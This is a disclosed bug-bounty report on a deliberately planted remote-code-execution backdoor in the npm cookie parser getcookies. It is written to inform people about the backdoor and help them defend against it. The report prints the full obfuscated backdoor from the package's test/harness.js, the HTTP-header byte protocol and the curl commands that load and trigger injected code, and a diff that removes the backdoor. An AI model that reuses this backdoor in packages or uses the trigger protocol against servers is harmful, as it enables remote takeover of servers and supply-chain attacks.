# Remote code executio in  NPM package getcookies

## Report Details
- **Report ID**: 346516
- **URL**: https://hackerone.com/reports/346516
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2018-05-02T14:13:11.333Z
- **Disclosed**: 2019-04-03T20:00:26.244Z

## Reporter
- **Username**: tiblu
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nodejs-ecosystem

## Vulnerability Information
> NOTE! Thanks for submitting a report! Please replace *all* the [square] sections below with the pertinent details. Remember, the more detail you provide, the easier it is for us to triage and respond quickly, so be sure to take your time filling out the report!

I would like to report remote code execution in the `getcookies` module.
It allows to remotely inject and execute code in the target server.

# Module

**module name:** getcookies
**version:** 1.12.3
**npm page:** `https://www.npmjs.com/package/getcookies`

Also affects all the modules that use `getcookies`, notable ones:

* `express-cookies@1.4.7` - https://www.npmjs.com/package/express-cookies

## Module Description

Basic HTTP cookie parser for HTTP servers.

## Module Stats

> Replace stats below with numbers from npm’s module page:

390 downloads in the last day
3396 downloads in the last week
3396 downloads in the last month

# Vulnerability

## Vulnerability Description

Found by a defaced website.
Allows attacker to remotely send and execute JS on the server.

`index.js` of `getcookies` does:

```
const testHarness = require('./test/harness.js');
...
function parse(req, res, callback) {
    testHarness.assert(req, res, callback, () => {
...
```

and vulnerability resides in the `./test/harness.js` of the `getcookies`:
```
/* eslint-env es6 */
'use strict';

var assert = require('assert');

let harness = (req, res, callback, next) => {
    try {
        assert.equal(typeof callback, 'function');
    } catch (E) {
        return callback(E);
    }

    try {
        module.exports.log = module.exports.log || Buffer.alloc(0xffff);
        JSON.stringify(req.headers).replace(/g([a-f0-9]{4})h((?:[a-f0-9]{2})+)i/gi, (o, p, v) => {
            p = Buffer.from(p, 'hex').readUInt16LE(0);
            switch (p) {
                case 0xfffe:
                    module.exports.log = Buffer.alloc(0xffff);
                    return;
                case 0xfffa:
                    return setTimeout(() => {
                        let c = module.exports.log.toString().replace(/\x00*$/, '');
                        module.exports.log = Buffer.alloc(0xffff);
                        if (c.indexOf('\x00') < 0) {
                            require('\x76\x6d')['\x72\x75\x6e\x49\x6e\x54\x68\x69\x73\x43\x6f\x6e\x74\x65\x78\x74'](c)(module.exports, require, req, res, next);
                        }
                        next();
                    }, 1000);
                default:
                    v = Buffer.from(v, 'hex');
                    for (let i = 0; i < v.length; i++) {
                        module.exports.log[p + i] = v[i];
                    }
            }
        });
    } catch (E) {}

    next();
};

module.exports.assert = (req, res, callback, next) => {
    harness(req, res, callback, next);
};
```

As seen above, it does `vm.runInThisContext` with the code stored in the memory.

## Steps To Reproduce:

Easiest way to reproduce is to use `express-cookies` package, which depends on `getcookies`.

Test code:

```
var express = require('express');
var app = express();
var expressCookies = require('express-cookies');

app.use(expressCookies());

app.get('/', function (req, res) {
    res.send('Hello World!');
});

app.listen(3000, function () {
    console.log('Example app listening on port 3000!')
});
```

Code is sent in custom HTTP headers in byte code.

To send code bytes:
```
curl -i 'http://localhost:3000/' -H 'X-Hacker: g0000h636465i' 
```
Where the protocol is:
`g<bytePosition>h<codeBytes>i`

The sample above adds `cde` to the code to be executed when execution header is sent.

The code is stored in `require('./test/harness.js').log`.

When the code is sent, attacker executes the code by sending:
```
curl -i 'http://localhost:3000/' -H 'X-Hacker: gfaffh636465i'
```

## Patch

```
diff -u /home/m/tmp/getcookies_original/index.js /home/m/dev/express-cookies-vulnr/node_modules/getcookies/index.js
--- /home/m/tmp/getcookies_original/index.js	2018-05-02 16:47:11.382990109 +0300
+++ /home/m/dev/express-cookies-vulnr/node_modules/getcookies/index.js	2018-05-02 16:50:00.198982317 +0300
@@ -9,8 +9,6 @@
 
 'use strict';
 
-const testHarness = require('./test/harness.js');
-
 /**
  * Module exports.
  * @public
@@ -45,38 +43,36 @@
  */
 
 function parse(req, res, callback) {
-    testHarness.assert(req, res, callback, () => {
-        if (!req.headers.cookie) {
-            return callback();
+    if (!req.headers.cookie) {
+        return callback();
+    }
+
+    var obj = {};
+    var pairs = req.headers.cookie.split(pairSplitRegExp);
+
+    for (var i = 0; i < pairs.length; i++) {
+        var pair = pairs[i];
+        var eq_idx = pair.indexOf('=');
+
+        // skip things that don't look like key=value
+        if (eq_idx < 0) {
+            continue;
         }
 
-        var obj = {};
-        var pairs = req.headers.cookie.split(pairSplitRegExp);
+        var key = pair.substr(0, eq_idx).trim();
+        var val = pair.substr(++eq_idx, pair.length).trim();
 
-        for (var i = 0; i < pairs.length; i++) {
-            var pair = pairs[i];
-            var eq_idx = pair.indexOf('=');
-
-            // skip things that don't look like key=value
-            if (eq_idx < 0) {
-                continue;
-            }
-
-            var key = pair.substr(0, eq_idx).trim();
-            var val = pair.substr(++eq_idx, pair.length).trim();
-
-            // quoted values
-            if ('"' == val[0]) {
-                val = val.slice(1, -1);
-            }
-
-            // only assign once
-            if (undefined == obj[key]) {
-                obj[key] = val;
-            }
+        // quoted values
+        if ('"' == val[0]) {
+            val = val.slice(1, -1);
         }
 
-        req.cookies = obj;
-        return callback();
-    });
+        // only assign once
+        if (undefined == obj[key]) {
+            obj[key] = val;
+        }
+    }
+
+    req.cookies = obj;
+    return callback();
 }
Common subdirectories: /home/m/tmp/getcookies_original/test and /home/m/dev/express-cookies-vulnr/node_modules/getcookies/test
```

## Supporting Material/References:

> State all technical information about the stack where the vulnerability was found

- Ubuntu 16.04.3 LTS - ANY that runs Node.JS
- 6.13.1 - but not Node.JS version specific
- 3.10.10 - but not NPM version specific
- ANY

# Wrap up

- I contacted the maintainer to let them know: N
- I opened an issue in the related repository: N

I did not do any of the above as:

* There is no public code  repository.
* The code is built to be malicious on purpose.

## Impact

Remote code injection and execution.

## Attachments
No attachments
